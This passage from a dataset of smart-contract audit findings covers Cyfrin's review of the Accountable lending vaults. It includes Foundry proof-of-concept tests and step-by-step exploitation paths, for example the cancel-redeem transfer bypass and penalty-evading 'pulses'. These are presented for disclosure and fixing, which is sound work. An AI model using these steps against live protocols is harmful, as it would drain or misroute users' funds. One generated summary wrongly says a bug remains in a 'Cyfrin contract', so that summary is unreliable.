      "content": "**Description:** Delinquency is flagged when vault reserves fall below `_calculateRequiredLiquidity()`, setting `delinquencyStartTime`. Late penalties only accrue after the grace period elapses. If the borrower briefly restores liquidity (e.g., `supply()`/`repay()`) before grace expiry, delinquency is cleared and `delinquencyStartTime` resets to 0. The borrower can immediately `borrow()` again to drop reserves to the threshold and the next block, when interest has accrued again, start a fresh grace window. This “pulse” can be executed back-to-back, even within one block, allowing the borrower to remain effectively delinquent indefinitely without ever incurring penalties.\n\n**Impact:** Borrowers can avoid late penalties while keeping lenders under-reserved, degrading lender protections.\n\n**Recommended Mitigation:** Consider removing the grace period entirely so penalties accrue as soon as the loan becomes delinquent. This would reduce complexity and be in line with how a lot of other lending protocols work.\n\nAlternatively consider redesigning the grace period to be cumulative, i.e. A year loan has a cumulative 1 week grace period which the borrower can draw from.\n\n**Accountable:** We will acknowledge this. We don't have an actionable path on how loans are managed when it comes to penalties grace periods or even whether penalties are enabled or not. Having a considerable grace period is by design and as a fallback a manager can always initiate a default. In most use-cases borrow/repay actions won't be very often and given these entities deploy funds to other venues, also off-chain, doing such actions can come with a reputational cost.",
      "summary": "\nThe report highlights a bug in the lending protocol where borrowers can avoid late penalties by briefly restoring their liquidity before the grace period expires. This allows them to remain delinquent indefinitely without incurring any penalties, which can harm lenders. The recommended solution is to either remove the grace period entirely or redesign it to be cumulative. The team responsible for the protocol will acknowledge the bug, but there is currently no clear plan on how to address it. This bug is due to the design of the protocol, where borrow/repay actions are not frequent and can come with a reputational cost.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62980",
      "title": "Fees never deducted in `AccountableOpenTerm` loan",
      "impact": "MEDIUM",
      "content": "**Description:** In `AccountableOpenTerm`, `interestData()` returns non-zero `performanceFee` and `establishmentFee`, but no path ever charges these fees. `_accrueInterest()` only updates `_scaleFactor` for base interest and none of `supply` or `repay` calls `FeeManager` (unlike FixedTerm’s `collect`). As a result, fees are never charged.\n\n**Impact:** Protocol/manager fees are effectively never taken.\n\n**Recommended Mitigation:** Consider charge the fee in `supply()`/`repay()`, before any other state changes. Compute fees for the elapsed period and transfer to `FeeManager`, then proceed.\n\n**Accountable:** Fixed in commits [`fce6961`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/fce6961c71269739ec35da60131eaf63e66e1726) and [`8e53eba`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/8e53eba7340f223f86c9c392f50b8b2d885fdd39)\n\n**Cyfrin:** Verified. `performanceFee` and `establishmentFee` are now deducted for open term loans.",
      "summary": "\nThis report describes a bug in the `AccountableOpenTerm` code. The `interestData()` function returns non-zero `performanceFee` and `establishmentFee`, but these fees are never charged. As a result, fees are effectively never taken by the protocol/manager. To fix this, the fees should be charged in the `supply()` and `repay()` functions, before any other state changes. This bug has been fixed in the commits `fce6961` and `8e53eba` by the `Accountable-Protocol` team. The bug has been verified and the fees are now correctly deducted for open term loans.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62979",
      "title": "`AccountableFixedTerm::claimInterest` unpredictable due to share burn mechanics",
      "impact": "MEDIUM",
      "content": "**Description:** [`AccountableFixedTerm::claimInterest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/strategies/AccountableFixedTerm.sol#L215-L217) lets a lender redeem their share of already-paid interest by burning vault shares and receiving assets. The burn uses a divisor based on the full-term max net return (fixed at loan acceptance), not the interest actually funded so far:\n\n```solidity\nuint256 maxNetYield = PRECISION + _interestParams.netReturn;\nclaimedInterest = shares.mulDiv(claimableInterest, totalShares, Math.Rounding.Floor);\nuint256 usedShares = claimedInterest.mulDiv(PRECISION, maxNetYield, Math.Rounding.Ceil);\n```\n\nBecause `netReturn` is an optimistic, end-of-term figure, early claimers burn fewer shares per unit claimed, shrinking `totalSupply` and making later outcomes order- and timing-dependent. This yields unpredictable per-user results and creates a systematic advantage for early claimers, especially harmful if the loan later underperforms or defaults, where early claims are crystallized at optimistic rates and late claimers eat the shortfall.\n\nIf the loan finishes without default and everyone eventually claims, equal-share lenders converge to the same total interest.\n\n**Impact:** * Unpredictable user payouts / MEV: Two equal lenders can claim different amounts purely due to claim order; bots can claim immediately after `pay()` to improve their take.\n* Asymmetric default risk: If the loan defaults before maturity, early claimers have already extracted cash flows computed using the potential full-term net return. Late/non-claimers are left with less remaining claimable interest/recovery, creating an unfair “claim early” optimization and worsening losses for cooperative users.\n* UX / reputational risk: Users pressing “claim” cannot deterministically know the amount; outcomes can be front-run within the same interval.\n\n**Proof of Concept:** Add the following test to `AccountableFixedTerm.t.sol`:\n```solidity\nfunction test_earlyClaimerAdvantage_dueToMaxNetReturnBurn_usdc() public {\n    vm.warp(1739893670);\n\n    // Setup borrower/terms identical to other tests\n    vm.prank(manager);\n    usdcLoan.setPendingBorrower(borrower);\n\n    vm.prank(borrower);\n    usdcLoan.acceptBorrowerRole();\n\n    vm.prank(manager);\n    usdcLoan.setTerms(\n        LoanTerms({\n            minDeposit: 0,\n            minRedeem: 0,\n            maxCapacity: USDC_AMOUNT,\n            minCapacity: USDC_AMOUNT / 2,\n            interestRate: 1e5,\n            interestInterval: 30 days,\n            duration: 360 days,\n            lateInterestGracePeriod: 2 days,\n            depositPeriod: 2 days,\n            acceptGracePeriod: 0,\n            lateInterestPenalty: 5e2,\n            withdrawalPeriod: 0\n        })\n    );\n\n    // Equal deposits for Alice & Bob\n    uint256 userDeposit = USDC_AMOUNT / 2;\n\n    uint256 aliceBalanceBefore = usdc.balanceOf(alice);\n    uint256 bobBalanceBefore   = usdc.balanceOf(bob);\n\n    vm.prank(alice);\n    usdcVault.deposit(userDeposit, alice, alice);\n\n    vm.prank(bob);\n    usdcVault.deposit(userDeposit, bob, bob);\n\n    // Sanity: equal initial shares\n    assertEq(usdcVault.balanceOf(alice), userDeposit, \"alice initial shares\");\n    assertEq(usdcVault.balanceOf(bob),   userDeposit, \"bob initial shares\");\n\n    // Accept loan\n    vm.warp(block.timestamp + 3 days);\n    vm.prank(borrower);\n    usdcLoan.acceptLoanLocked();\n\n    // Fund borrower to pay interest and approve\n    usdc.mint(borrower, 2_000_000e6);\n    vm.prank(borrower);\n    usdc.approve(address(usdcLoan), 2_000_000e6);\n\n    uint256 aliceMidClaim;\n    uint256 aliceEndClaim;\n    uint256 bobEndClaim;\n\n    // Pay month by month; Alice claims once in the middle, Bob waits\n    for (uint8 i = 1; i <= 12; i++) {\n        uint256 nextDueDate = usdcLoan.loan().startTime + (i * usdcLoan.loan().interestInterval);\n        vm.warp(nextDueDate + 1 days);\n\n        // Borrower pays owed interest for this interval\n        vm.startPrank(borrower);\n        uint256 owed = _interestOwed(usdcLoan);\n        usdcLoan.pay(owed);\n        vm.stopPrank();\n\n        // Alice claims right after month 6 payment\n        if (i == 6) {\n            vm.prank(alice);\n            aliceMidClaim = usdcLoan.claimInterest();\n            assertGt(aliceMidClaim, 0, \"alice mid-term claim > 0\");\n        }\n    }\n\n    // After last payment, both can claim\n    vm.prank(alice);\n    aliceEndClaim += usdcLoan.claimInterest();\n\n    vm.prank(bob);\n    bobEndClaim += usdcLoan.claimInterest();\n\n    uint256 aliceTotal = aliceMidClaim + aliceEndClaim;\n    uint256 bobTotal   = bobEndClaim;\n\n    // Alice has gotten more than Bob by claiming early\n    assertGt(aliceTotal, bobTotal, \"Alice (mid+end) should claim more than Bob (end only)\");\n\n    // repay & clean-up\n    vm.prank(borrower);\n    usdcLoan.repay(0);\n\n    // Ensure both still redeem principal back pro-rata after interest claims\n    uint256 sharesAlice = usdcVault.balanceOf(alice);\n    uint256 sharesBob   = usdcVault.balanceOf(bob);\n\n    vm.prank(alice);\n    usdcVault.requestRedeem(sharesAlice, alice, alice);\n    vm.prank(bob);\n    usdcVault.requestRedeem(sharesBob, bob, bob);\n\n    vm.startPrank(alice);\n    uint256 maxWithdrawAlice = usdcVault.maxWithdraw(alice);\n    usdcVault.withdraw(maxWithdrawAlice, alice, alice);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    uint256 maxWithdrawBob = usdcVault.maxWithdraw(bob);\n    usdcVault.withdraw(maxWithdrawBob, bob, bob);\n    vm.stopPrank();\n\n    assertEq(usdcVault.balanceOf(alice), 0, \"alice no shares\");\n    assertEq(usdcVault.balanceOf(bob),   0, \"bob no shares\");\n\n    uint256 aliceBalanceAfter  = usdc.balanceOf(alice);\n    uint256 bobBalanceAfter    = usdc.balanceOf(bob);\n\n    uint256 aliceGain = aliceBalanceAfter - aliceBalanceBefore;\n    uint256 bobGain   = bobBalanceAfter   - bobBalanceBefore;\n\n    // Alice and Bob has gained the same in the end\n    assertEq(aliceGain, bobGain, \"alice and bob gained the same\");\n}\n```\n\n**Recommended Mitigation:** Consider replacing the share-burn with an accumulator (“rewards-per-share”) model: Maintain a high-precision `accInterestPerShare` that increases only when real net interest is paid (after fees) by `netInterest / totalShares`; each lender tracks a checkpoint of this accumulator, and on claim receives `(accCurrent − checkpoint) × shares`, then updates their checkpoint.\nIf transfers/mints/burns were ever allowed mid-loan, first settle pending interest for the party(ies) at the current accumulator and then adjust checkpoints:\n```solidity\nuint256 accInterestPerShare;\nmapping(address user => uint256 index) userIndex;\nmapping(address user => uint256 interest) pendingInterest;\n\nfunction onTransfer(address from, address to, uint256 amount) external onlyVault nonReentrant {\n\n    // Settle sender’s pending interest (if not mint)\n    if (from != address(0)) {\n        _settleAccount(from);\n        userIndex[from] = accInterestPerShare;\n    }\n\n    // Settle receiver’s pending interest (if not burn)\n    if (to != address(0)) {\n        _settleAccount(to);\n        userIndex[to] = accInterestPerShare;\n    }\n\n}\n\n/// Internal: settle one account’s pending interest using current accumulator\nfunction _settleAccount(address user) internal {\n    uint256 shares = vault.balanceOf(user);\n    uint256 idx = userIndex[user];\n\n    if (shares == 0) {\n        userIndex[user] = accInterestPerShare;\n        return;\n    }\n\n    uint256 delta  = accInterestPerShare - idx;\n    if (delta == 0) return;\n\n    pendingInterest[user] += (shares * delta) / PRECISION;\n    userIndex[user] = accInterestPerShare;\n}\n```\n\nThis makes payouts deterministic and call-order independent, distributes only actually received interest (so no “pre-claiming” future yield), and remains fair under partial payments or defaults while preserving price invariance without burning.\n\n**Accountable:** Fixed in commits [`19a50c8`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/19a50c8e1275545ae3e461233f4699cb681ec731) and [`fd74c1d`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/fd74c1d62d4b1ae8cac03f501fd398e1a6854545)\n\n**Cyfrin:** Verified. An interest accrual system is used and the vault now calls an `onTransfer`-hook on the strategy for transfers.",
      "summary": "\nThis bug report describes an issue with the `claimInterest` function in the `AccountableFixedTerm` contract. The function allows lenders to redeem their share of already-paid interest by burning vault shares and receiving assets. However, the burn uses a divisor based on the full-term max net return, rather than the actual interest funded so far. This creates an advantage for early claimers and can lead to unpredictable payouts, asymmetric default risk, and potential front-running by bots. The report suggests a mitigation by replacing the share-burn with an accumulator model, which has since been implemented in the code. The bug has been fixed in the commits `19a50c8` and `fd74c1d` by the `Accountable` team. The report has been verified by `Cyfrin`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62978",
      "title": "Manual/Instant `fulfillRedeemRequest` doesn’t reserve liquidity",
      "impact": "MEDIUM",
      "content": "**Description:** `AccountableAsyncRedeemVault` account for reserved liquidity only when processing the queue through (`AccountableWithdrawalQueue::processUpToShares` / `AccountableWithdrawalQueue::processUpToRequestId`).\nHowever, the manual fulfillment paths (`fulfillRedeemRequest`) and the instant branch of `requestRedeem` mark shares as claimable without increasing `reservedLiquidity`.\n\nWhen these paths are mixed, multiple fulfillments can each pass the “liquidity” check independently (because nothing was reserved by earlier fulfills), producing a state where:\n\n```\nsum(claimable assets across users)  >  vault.totalAssets() - reservedLiquidity\n```\n\nPotentially causing claimable assets to be larger than the available liquidity.\n\n**Impact:** The vault can end up with more claimable redemptions than available assets, causing later withdrawals to revert (depending on integration logic), and creating fairness and accounting issues between users.\n\n**Proof of Concept:** Add the following test to `AccountableWithdrawalQueue.t.sol`:\n```solidity\nfunction test_manualFulfill_vsQueuedFulfill_mismatch() public {\n    // Setup: price = 1e36, deposits for Alice & Bob\n    _setupInitialDeposits(1e36, DEPOSIT_AMOUNT);\n\n    uint256 aliceHalf = vault.balanceOf(alice) / 2;\n    uint256 bobHalf   = vault.balanceOf(bob)   / 2;\n\n    // === (A) Queue Bob first and reserve via processor ===\n    vm.prank(bob);\n    uint256 bobReqId = vault.requestRedeem(bobHalf, bob, bob);\n    assertEq(bobReqId, 1, \"Bob should be the head of the queue\");\n\n    // Processor path reserves liquidity for Bob\n    uint256 price = strategy.sharePrice(address(vault)); // 1e36\n    uint256 expectedBobAssets = (bobHalf * price) / 1e36;\n    uint256 used = vault.processUpToShares(bobHalf);\n    assertEq(used, expectedBobAssets, \"queued fulfill reserves exact assets for Bob\");\n\n    // Sanity: reservedLiquidity == Bob's claimable assets\n    uint256 reservedBefore = vault.reservedLiquidity();\n    assertEq(reservedBefore, expectedBobAssets, \"only Bob's queued path bumped reservedLiquidity\");\n\n    // === (B) Now manually fulfill Alice (no reservation bump) ===\n    vm.prank(alice);\n    uint256 aliceReqId = vault.requestRedeem(aliceHalf, alice, alice);\n    assertEq(aliceReqId, 2, \"Alice should be behind Bob in the queue\");\n\n    // Manual fulfill creates claimables but doesn't increase reservedLiquidity\n    strategy.fulfillRedeemRequest(0, address(vault), alice, aliceHalf);\n\n    // Compute claimables in assets\n    uint256 aliceClaimableShares = vault.claimableRedeemRequest(0, alice);\n    uint256 bobClaimableShares   = vault.claimableRedeemRequest(0, bob);\n    assertEq(aliceClaimableShares, aliceHalf, \"Alice claimable shares set by manual fulfill\");\n    assertEq(bobClaimableShares,   bobHalf,   \"Bob claimable shares set by queued processor\");\n\n    uint256 aliceClaimableAssets = (aliceClaimableShares * price) / 1e36;\n    uint256 bobClaimableAssets   = (bobClaimableShares   * price) / 1e36;\n    uint256 totalClaimables      = aliceClaimableAssets + bobClaimableAssets;\n\n    // Mismatch: claimables exceed reservedLiquidity because Alice's path didn't reserve\n    assertGt(totalClaimables, reservedBefore, \"claimables > reservedLiquidity (oversubscription)\");\n\n    // === (C) Bob withdraws his reserved claim → consumes all reservation ===\n    uint256 bobMax = vault.maxWithdraw(bob);\n    assertEq(bobMax, bobClaimableAssets, \"Bob can withdraw exactly his reserved amount\");\n\n    uint256 vaultAssetsBefore = vault.totalAssets();\n    vm.prank(bob);\n    vault.withdraw(bobMax, bob, bob);\n\n    // After paying Bob, reservation is zero, but Alice still has claimables (unreserved)\n    uint256 reservedAfter = vault.reservedLiquidity();\n    assertEq(reservedAfter, 0, \"all reserved liquidity consumed by Bob's withdrawal\");\n\n    uint256 aliceClaimableShares2 = vault.claimableRedeemRequest(0, alice);\n    uint256 aliceClaimableAssets2 = (aliceClaimableShares2 * price) / 1e36;\n    assertEq(aliceClaimableShares2, aliceHalf, \"Alice still has claimables (manual path)\");\n    assertGt(aliceClaimableAssets2, reservedAfter, \"manual claimables remain with zero reservation\");\n\n    // Optional sanity: vault asset balance decreased by Bob's withdrawal only\n    uint256 vaultAssetsAfter = vault.totalAssets();\n    assertEq(vaultAssetsBefore - vaultAssetsAfter, bobMax, \"vault paid only the reserved portion\");\n}\n```\n\n**Recommended Mitigation:** Consider making `_fulfillRedeemRequest` the single source of truth for reservation accounting:\n\n1. Move`reservedLiquidity` bump into `_fulfillRedeemRequest`.\n2. Remove `reservedLiquidity` increments from `processUpToShares` / `processUpToRequestId` (to avoid double counting).\n\n**Accountable:** Fixed in commit [`c3a7cbf`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/c3a7cbf0275a758a5d816c9f3298bc95d788db4f)\n\n**Cyfrin:** Verified. Recommended mitigation implemented. `reservedLiquidity` is tracked in `_fulfillRedeemRequest` and removed form the \"process\" functions.",
      "summary": "\nThe bug report describes an issue with the `AccountableAsyncRedeemVault` where the manual fulfillment and instant branch of `requestRedeem` do not properly account for reserved liquidity. This can result in multiple fulfillments passing the \"liquidity\" check independently, causing the vault to have more claimable redemptions than available assets. This can lead to later withdrawals failing and fairness and accounting issues between users. A proof of concept test is provided and a mitigation is recommended which involves making `_fulfillRedeemRequest` the single source of truth for reservation accounting. The bug has been fixed and verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62977",
      "title": "InvestmentManager can use `AccountableFixedTerm::coverDefault` to misuse token approvals from anyone",
      "impact": "MEDIUM",
      "content": "**Description:** `AccountableFixedTerm::coverDefault` allows InvestmentManager of the loan to add additional assets to the system.\n\n```solidity\n    function coverDefault(uint256 assets, address provider) external onlySafetyModuleOrManager whenNotPaused {\n        _requireLoanInDefault();\n\n        loanState = LoanState.InDefaultClaims;\n\n        IAccountableVault(vault).lockAssets(assets, provider);\n\n        emit DefaultCovered(safetyModule, provider, assets);\n    }\n```\n\nAnd `lockAssets()` pulls assets from the input \"provider\" address, transferring them to the vault.\n\nThis means any user address who had asset token balance, and approved the vault contract (potential pending approvals from the past) is at risk of losing their funds here.\n\nThe Manager can pull funds from a random provider address without any permissions, and the \"provider\" would lose his approved funds without getting anything in return.\n\n**Impact:** Any pending asset approvals from user => vault contract, can be misused to cover loan default.\n\nThe same problem also exists in AccountableOpenTerm.\n\n**Recommended Mitigation:** Consider removing the \"provider\" address logic from `coverDefault()`, and simply pull assets from `msg.sender`.\n\n**Accountable:** Fixed in commit [`014d7fb`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/014d7fb6f11766fada9054a736a264cf1d95c9f6)\n\n**Cyfrin:** Verified. `provider` is removed.",
      "summary": "\nThe bug report describes an issue in the code for the `coverDefault` function in the `AccountableFixedTerm` contract. This function allows the InvestmentManager of a loan to add additional assets to the system. However, the code also allows the manager to pull assets from a random user's address without their permission, potentially resulting in the loss of their funds. This issue also exists in the `AccountableOpenTerm` contract. The report recommends removing the \"provider\" address logic and using `msg.sender` instead. The bug has been fixed in the code and verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62976",
      "title": "`AccountableAsyncRedeemVault` allows deposits for non-whitelisted or non-KYCed addresses",
      "impact": "MEDIUM",
      "content": "**Description:** Almost all functions in `AccountableAsyncRedeemVault` use an `onlyAuth()` modifier to verify that the caller is KYC-ed or Whitelisted (according to the vault's own policy).\n\nThis logic can be seen in `isVerified()` function in AccessBase.sol\n\nHere is the `AccountableAsyncRedeemVault::onlyAuth` modifier :\n\n```solidity\n    modifier onlyAuth() {\n        if (!isVerified(msg.sender, msg.data)) revert Unauthorized();\n        _;\n    }\n\n```\n\nThis passes `msg.sender` as the \"Account\" address to be verified, but these checks are not working.\n\nIf we look at the `deposit()` function here, `msg.sender` is not the actual account address, for whom the deposit will be done, instead the \"receiver\" address here is the actual account. The \"Receiver\" address receives the shares but it is not verified that they are whitelisted/ KYC-ed.\n\n```solidity\n    function deposit(uint256 assets, address receiver, address controller) public onlyAuth returns (uint256 shares) {\n        _checkController(controller);\n        if (assets == 0) revert ZeroAmount();\n        if (assets > maxDeposit(controller)) revert ExceedsMaxDeposit();\n\n        uint256 price = strategy.onDeposit(address(this), assets, receiver, controller);\n        shares = _convertToShares(assets, price, Math.Rounding.Floor);\n\n        _mint(receiver, shares);\n        _deposit(controller, assets);\n\n```\n\nThis means that a KYC'ed user can call `deposit()` and mint new share tokens for random \"receiver\" addresses (who have set the KYC'ed user as their operator using `setOperator()` and for the input params `controller == receiver` can be used). This \"receiver\" can then take part in the vault by holding vault shares, redeeming them via the operator etc.\n\n**Impact:** The KYC/ Whitelist configuration does not prevent KYC’ed addresses from minting shares to non-KYCed addresses.\n\nSimilar problems might exist in the access control for other methods in the vault, the reason being `onlyAuth()` only checks the msg.sender and not the other address holding the position.\n\n**Recommended Mitigation:** Consider documenting what is the intended permissions granted to a KYC-ed/ Whitelisted user. If they should not be allowed to open positions for other non KYC-ed addresses, then the auth checks need to be done for actual receiver/ controller addresses.\n\n**Accountable:** Fixed in commits [`c804a31`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/c804a31d3e5b161065b775fa57f3590be3581e5a) and [`2eeb273`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/2eeb2736eb5ba8dafa2c9f2f458b31fd8eb2d6bf)\n\n**Cyfrin:** Verified. Both `reciever` and `controller` are verified to be KYC'd throughout the calls.",
      "summary": "\nThe bug report explains that there is an issue with the `onlyAuth()` modifier in the `AccountableAsyncRedeemVault` function. This modifier is used to verify that the caller is KYC-ed or Whitelisted, but it is not working properly. The report suggests that the problem may also exist in other parts of the vault. The recommended solution is to check for KYC-ed addresses in the actual receiver and controller addresses, instead of just the msg.sender. The bug has been fixed in the latest commits by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62975",
      "title": "`transferWhitelist` checks are missing in `AccountableVault::_checkTransfer`",
      "impact": "MEDIUM",
      "content": "**Description:** AccountableVault.sol employs a \"transferWhitelist\" feature to help select addresses that should be allowed to transfer vault shares, overriding the other restrictions checked in `_checkTransfer()`.\n\nBoth `transfer()` and `transferFrom()` functions internally call `_checkTransfer()`, but the \"transferWhitelist\" check is missing in all transfer flows.\n\n**Impact:** The transferWhitelist feature does not work, so it does not make a difference if an address was whitelisted or not.\n\n```solidity\n    /// @notice Mapping of addresses that can override transfer restrictions\n    mapping(address => bool) public transferWhitelist;\n```\n\nThe comment above says \"Mapping of addresses that can override transfer restrictions\" which does not hold true as transferWhitelist is never being checked.\n\nA method to call vault.setTransferWhitelist() is also missing in both the current strategy contracts, so when fixing keep note of it.\n\n**Recommended Mitigation:**\n```solidity\n    function _checkTransfer(uint256 amount, address from, address to) private {\n\n+++      if(transferWhitelist[from] && transferWhitelist[to]) return;\n\n        if (amount == 0) revert ZeroAmount();\n        if (!transferableShares) revert SharesNotTransferable();\n        if (!isVerified(to, msg.data)) revert Unauthorized();\n        if (throttledTransfers[from] > block.timestamp) revert TransferCooldown();\n    }\n```\n\nAlso consider adding a method to the AccountableFixedTerm and AccountableOpenTerm strategy contracts (one that calls vault.setTransferWhitelist()) if it is required in context of that strategy.\n\n**Accountable:** Whitelist removed in commit [`6a81e38`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/6a81e389513ad690216fc8c037ec69513f3121c7)\n\n**Cyfrin:** Verified. Whitelist removed.",
      "summary": "\nThe AccountableVault.sol contract has a feature called \"transferWhitelist\" that is supposed to allow certain addresses to transfer vault shares, overriding other restrictions. However, this feature is not working and is not being checked in the transfer functions. This means that the whitelist does not have any effect and any address can transfer shares. To fix this, the _checkTransfer() function needs to be updated to include a check for the transferWhitelist. Additionally, a method to set the whitelist should be added to the strategy contracts. This issue has been fixed in the Accountable contract, but it is still present in the Cyfrin contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62974",
      "title": "Complete bypass of transfer restrictions on vault share token is possible",
      "impact": "MEDIUM",
      "content": "**Description:** In `AccountableVault.sol` (which is inherited by the `AccountableAsyncRedeemVault`, we have certain transfer restrictions (KYC, if from address is subject to a throttle timestamp), applied in `_checkTransfer()` function.\n\nThese restrictions are applied on `transfer()`/ `transferFrom()` function (inherited from ERC20) when share holders try to move their holdings.\n\nThese restrictions do not apply when the internal `_transfer()` function is used, which is fine for most cases as these share tokens will be moved only for deposits and redeems.\n\nBut there is one case where user can use the `cancelRedeemRequest()` feature to bypass all these restrictions completely, and move share tokens to a different address.\n\nThis is how it can be done :\n\n- Assume controller has a deposit in the vault\n- Controller places a redeem request\n- Controller immediately cancels the redeem request\n- Controller calls `claimCancelRedeemRequest()` where share tokens are transferred to a \"receiver\" address\n\n```solidity\n   function claimCancelRedeemRequest(uint256 requestId, address receiver, address controller)\n        public\n        onlyAuth\n        returns (uint256 shares)\n    {\n        _checkController(controller);\n        VaultState storage state = _vaultStates[controller];\n        shares = state.claimableCancelRedeemRequest;\n        if (shares == 0) revert ZeroAmount();\n\n        strategy.onClaimCancelRedeemRequest(address(this), controller);\n\n        state.claimableCancelRedeemRequest = 0;\n\n        _transfer(address(this), receiver, shares); // @audit bypasses all transfer restrictions.\n\n        emit CancelRedeemClaim(receiver, controller, requestId, msg.sender, shares);\n    }\n```\n\nFor this transfer step, the internal `_transfer()` function is used which skips all transfer restrictions applicable as per AccountableVault logic.\n\n**Impact:** This \"receiver\" address input while calling `claimCancelRedeemRequest()` is the controller's choice and there are no checks on it as `_checkTransfer()` gets bypassed. This allows to transfer shares even if \"to\" address is not KYC-ed or transfers originating at \"from\" address had to work with a cooldown time.\n\nThis way controller is able to move their vault shares to a random receiver address, bypassing the transfer restrictions.\n\n**Recommended Mitigation:** In `claimCancelRedeemRequest()`, remove the receiver address logic and just transfer the cancelled shares back to the controller address. This solves the issue as controller is already expected to be KYC-ed, and there will be no need for a cooldown check in that case as shares are going back to the original holder.\n\n**Accountable:** Fixed in commit [`2eeb273`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/2eeb2736eb5ba8dafa2c9f2f458b31fd8eb2d6bf)\n\n**Cyfrin:** Verified. `reciever` now checked against KYC.",
      "summary": "\nThe `AccountableVault.sol` file has a function called `_checkTransfer()` that applies restrictions on transferring shares. However, these restrictions are not applied when using the `cancelRedeemRequest()` feature, allowing the controller to transfer shares to a different address without any checks. This can be done by placing a redeem request and then immediately cancelling it, followed by calling `claimCancelRedeemRequest()` with the \"receiver\" address set to the desired destination. To fix this issue, the receiver address logic should be removed and the shares should be transferred back to the controller address. This has been fixed in the latest commit by the Accountable team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62973",
      "title": "`AccountableOpenTerm` loan interest cannot be repaid once principal hits zero",
      "impact": "HIGH",
      "content": "**Description:** In `AccountableOpenTerm`, interest accrues virtually via `_scaleFactor`, but there is no mechanism to pay/realize that interest. The only funding paths are `borrow()`, `supply()`, and `repay()`. Both `supply()` and `repay()` first service withdrawals and then reduce `_loan.outstandingPrincipal`. When principal reaches zero, `repay()` sets `loanState = Repaid`; in `Repaid`, `_requireLoanOngoing()` blocks further `supply()/repay()`, and `_sharePrice()` switches to `assetShareRatio()` (ignoring accrued `_scaleFactor`). As a result, any accrued interest becomes unpayable and is never delivered to LPs (or fee recipients).\n\n**Impact:** If the borrower repays the principa after time has passed, the loan flips to `Repaid` and all accrued interest is effectively forgiven. LPs receive principal back with zero interest. A borrower can always avoid interest by repaying principal before realizing it. This can happen intentionally by a malicious borrower or even unintentionally since the payments decrease principal first. Hence all interest needs to be repaid with the last payment.\n\n**Proof of Concept:** Add the following test to `AccountableOpenTerm.t.sol`:\n```solidity\nfunction test_openTerm_repay_principal_only_setsRepaid_no_interest_paid() public {\n    vm.warp(1739893670);\n\n    // Setup borrower & terms\n    vm.prank(manager);\n    usdcLoan.setPendingBorrower(borrower);\n    vm.prank(borrower);\n    usdcLoan.acceptBorrowerRole();\n\n    LoanTerms memory terms = LoanTerms({\n        minDeposit: 0,\n        minRedeem: 0,\n        maxCapacity: USDC_AMOUNT,\n        minCapacity: USDC_AMOUNT / 2,\n        interestRate: 150_000,           // 15% APR so scale factor grows visibly\n        interestInterval: 30 days,\n        duration: 0,\n        depositPeriod: 2 days,\n        acceptGracePeriod: 0,\n        